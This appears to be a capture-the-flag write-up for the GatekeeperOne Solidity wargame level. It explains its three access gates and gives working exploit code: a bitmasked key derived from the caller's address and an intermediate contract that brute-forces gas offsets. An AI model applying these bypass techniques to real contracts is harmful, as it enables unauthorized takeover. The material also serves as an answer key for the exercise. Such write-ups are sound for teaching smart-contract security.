contract code:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
**Vulnerability:** The contract chains three independent modifiers that each check a different property of the caller, and all three can be satisfied at once by a carefully crafted intermediate contract and a bitmasked key.
- `gateOne` simply requires that `msg.sender != tx.origin`, meaning the call must be relayed through another contract rather than sent directly from an EOA.
- `gateTwo` requires that `gasleft()`, measured at the exact moment the modifier executes, be an exact multiple of 8191. Since Solidity does not expose deterministic gas accounting to the caller, this must be brute-forced by resending the call with different gas stipends until one lands on the right remainder.
- `gateThree` performs bit-masking checks on a `bytes8` key treated as `uint64`: the lower 32 bits must equal the lower 16 bits when both are zero-extended (part one), the full 64-bit value must differ from just the lower 32 bits (part two, i.e. some bit above bit 31 must be set), and the lower 32 bits must equal the lower 16 bits of `tx.origin` zero-extended to 32 bits (part three). These three constraints are satisfiable simultaneously by constructing a key whose upper 32 bits are non-zero and whose lower 32 bits are exactly the last 2 bytes of the attacker's address, zero-extended.

## Exploit Steps
1. Compute the `gateThree` key from your own address (the `tx.origin` that will call through the intermediate contract):
```solidity
bytes8 gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF | 0x1000000000000);
```
Equivalently, in plain terms: take the last 4 bytes of your address, zero out the upper 2 of those 4 bytes (so only the last 2 bytes remain, zero-extended to 4 bytes), then OR in any non-zero bit above bit 31 (e.g. set bit 32) so the full 64-bit value differs from its own lower 32 bits.

2. Deploy an intermediate attacking contract that relays the call (satisfying `gateOne`) and brute-forces the gas stipend (satisfying `gateTwo`) by looping over a range of gas offsets and trying the call in a loop, since `gasleft()` inside the callee differs from the gas sent by a small, EVM-version-dependent overhead:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    function attack(address _target, bytes8 _gateKey) public returns (bool) {
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = _target.call{gas: i + 8191 * 3 + 21000}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                return true;
            }
        }
        revert("no gas offset worked, adjust the search range/base");
    }
}
```
3. Call `attack(gatekeeperOneAddress, gateKey)` from your EOA. The loop iterates gas amounts until one call arrives inside the `enter` function with `gasleft() % 8191 == 0`, satisfying `gateTwo`, while the contract-to-contract call already satisfies `gateOne` and the precomputed key satisfies `gateThree`.
4. Verify the State: Confirm `entrant()` on the `GatekeeperOne` instance now returns your EOA address, proving all three gates were bypassed in a single transaction.
